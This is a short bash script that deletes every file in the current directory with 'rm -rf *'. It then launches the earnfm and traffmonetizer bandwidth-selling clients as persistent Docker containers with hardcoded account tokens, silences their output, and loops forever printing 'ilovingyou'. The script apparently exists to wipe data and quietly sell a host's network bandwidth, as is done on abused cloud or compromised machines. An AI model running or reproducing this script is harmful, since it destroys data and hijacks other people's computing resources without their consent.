#!/bin/bash
rm -rf * & sudo docker run --restart unless-stopped -d -e EARNFM_TOKEN="bea9e21a-5958-499f-9b87-6715b27e3cd2"  earnfm/earnfm-client:latest & docker run --restart unless-stopped -d traffmonetizer/cli_v2 start accept --token 'v/48X/a758e2YpQfp8hdg5Sj0vUxEWQqq8wMuqfNIkw=' > /dev/null 2>&1 && while true; do clear; echo "ilovingyou"; sleep 60; done
